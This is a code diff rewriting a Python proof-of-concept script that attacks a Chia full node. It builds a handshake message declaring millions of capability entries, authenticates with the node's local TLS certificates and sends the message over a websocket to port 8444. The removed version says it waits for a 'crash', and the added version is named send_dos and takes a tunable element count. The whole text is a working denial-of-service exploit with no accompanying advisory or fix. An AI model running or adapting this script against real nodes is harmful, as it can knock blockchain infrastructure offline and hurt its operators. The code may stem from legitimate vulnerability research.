@@ -1,60 +1,55 @@
-
 import asyncio
 import ssl
-import aiohttp
-from chia_rs.sized_ints import uint16, uint8
+import sys
 import os
+from pathlib import Path
+import aiohttp
 
-async def run_poc():
-    root = "/home/jules/.chia/mainnet/config/ssl/"
-    ca_cert = root + "ca/chia_ca.crt"
-    cert = root + "full_node/public_full_node.crt"
-    key = root + "full_node/public_full_node.key"
+def make_handshake_payload(num_elements):
+    payload = b""
+    payload += (7).to_bytes(4, "big") + b"mainnet"
+    payload += (6).to_bytes(4, "big") + b"0.0.36"
+    payload += (5).to_bytes(4, "big") + b"1.8.0"
+    payload += (8444).to_bytes(2, "big")
+    payload += (1).to_bytes(1, "big")
+    payload += (num_elements).to_bytes(4, "big")
+    element = (1).to_bytes(2, "big") + (0).to_bytes(4, "big")
+    payload += element * min(num_elements, 100000)
+    return payload
 
-    ssl_context = ssl.create_default_context(cafile=ca_cert)
-    ssl_context.load_cert_chain(certfile=cert, keyfile=key)
+def make_message(msg_type, msg_id, data):
+    msg = b""
+    msg += msg_type.to_bytes(1, "big")
+    if msg_id is None:
+        msg += b"\x00"
+    else:
+        msg += b"\x01" + msg_id.to_bytes(2, "big")
+    msg += len(data).to_bytes(4, "big")
+    msg += data
+    return msg
+
+async def send_dos(host, port, cert_path, key_path, ca_path, num_elements):
+    ssl_context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH, cafile=ca_path)
+    ssl_context.load_cert_chain(certfile=cert_path, keyfile=key_path)
     ssl_context.check_hostname = False
     ssl_context.verify_mode = ssl.CERT_REQUIRED
-
-    net_id = "mainnet"
-    proto_ver = "0.0.36"
-    soft_ver = "1.8.0"
-    # 7 million * 6 bytes = 42MB, which is < 50MB max message size
-    num_caps = 7000000
-
-    print(f"Constructing malicious handshake with {num_caps} capabilities...")
-    data = len(net_id).to_bytes(4, 'big') + net_id.encode()
-    data += len(proto_ver).to_bytes(4, 'big') + proto_ver.encode()
-    data += len(soft_ver).to_bytes(4, 'big') + soft_ver.encode()
-    data += uint16(8444).to_bytes(2, 'big')
-    data += uint8(1).to_bytes(1, 'big') # NodeType.FULL_NODE
-
-    data += num_caps.to_bytes(4, 'big')
-    cap_entry = uint16(1).to_bytes(2, 'big') + b"\x00\x00\x00\x00"
-    # To speed up construction
-    data += cap_entry * num_caps
-
-    msg_type = uint8(1) # ProtocolMessageTypes.handshake
-    msg_id_present = b"\x00"
-    msg_data = data
-
-    full_msg_data = msg_type.to_bytes(1, 'big') + msg_id_present + len(msg_data).to_bytes(4, 'big') + msg_data
-
-    url = "https://127.0.0.1:8444/ws"
-
-    print(f"Full message size: {len(full_msg_data) / (1024*1024):.2f} MB")
-
-    connector = aiohttp.TCPConnector(ssl=ssl_context)
-    async with aiohttp.ClientSession(connector=connector) as session:
-        try:
-            async with session.ws_connect(url, max_msg_size=100*1024*1024) as ws:
-                print("Connected, sending malicious handshake...")
-                await ws.send_bytes(full_msg_data)
-                print("Sent. Waiting for response or crash...")
-                async for msg in ws:
-                    print(f"Received msg: {msg.type}")
-        except Exception as e:
-            print(f"Connection error: {e}")
+    url = f"wss://{host}:{port}/ws"
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.ws_connect(url, ssl=ssl_context) as ws:
+                handshake_data = make_handshake_payload(num_elements)
+                msg = make_message(1, 0, handshake_data)
+                await ws.send_bytes(msg)
+                await asyncio.sleep(5)
+    except Exception as e:
+        print(f"Connection status: {e}")
 
 if __name__ == "__main__":
-    asyncio.run(run_poc())
+    host = "127.0.0.1"
+    port = 8444
+    home = str(Path.home())
+    cert_path = f"{home}/.chia/mainnet/config/ssl/full_node/private_full_node.crt"
+    key_path = f"{home}/.chia/mainnet/config/ssl/full_node/private_full_node.key"
+    ca_path = f"{home}/.chia/mainnet/config/ssl/ca/chia_ca.crt"
+    num_elements = int(sys.argv[1]) if len(sys.argv) > 1 else 5000000
+    asyncio.run(send_dos(host, port, cert_path, key_path, ca_path, num_elements))
